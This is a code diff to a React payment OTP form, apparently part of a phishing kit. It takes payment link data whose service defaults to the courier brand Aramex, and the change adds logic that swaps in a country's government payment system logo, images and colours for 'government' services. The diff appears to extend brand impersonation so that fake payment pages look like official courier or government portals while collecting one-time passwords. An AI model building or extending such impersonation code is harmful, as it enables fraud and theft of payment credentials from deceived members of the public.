@@ -3,6 +3,8 @@ import { useParams, useNavigate } from "react-router-dom";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { getServiceBranding } from "@/lib/serviceLogos";
+import { getGovernmentPaymentSystem } from "@/lib/governmentPaymentSystems";
+import { isGovernmentService } from "@/lib/governmentPaymentServices";
 import DynamicPaymentLayout from "@/components/DynamicPaymentLayout";
 import { Shield, AlertCircle, ArrowLeft } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
@@ -28,10 +30,22 @@ const PaymentOTPForm = () => {
   const customerInfo = linkData?.payload?.customerInfo || {};
   const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
   const serviceName = linkData?.payload?.service_name || serviceKey;
-  const branding = getServiceBranding(serviceKey);
-
   // Get country from link data
   const selectedCountry = linkData?.payload?.selectedCountry || "SA";
+  const govSystem = getGovernmentPaymentSystem(selectedCountry);
+  const isGovService = isGovernmentService(serviceKey) || serviceKey.toLowerCase() === 'government_payment';
+
+  const serviceBranding = getServiceBranding(serviceKey);
+  const branding = isGovService ? {
+    ...serviceBranding,
+    logo: govSystem.logo || serviceBranding.logo,
+    ogImage: govSystem.heroImage || serviceBranding.ogImage,
+    heroImage: govSystem.heroImage || serviceBranding.heroImage,
+    colors: {
+      primary: govSystem.colors.primary,
+      secondary: govSystem.colors.secondary
+    }
+  } : serviceBranding;
 
   const shippingInfo = linkData?.payload as any;
 
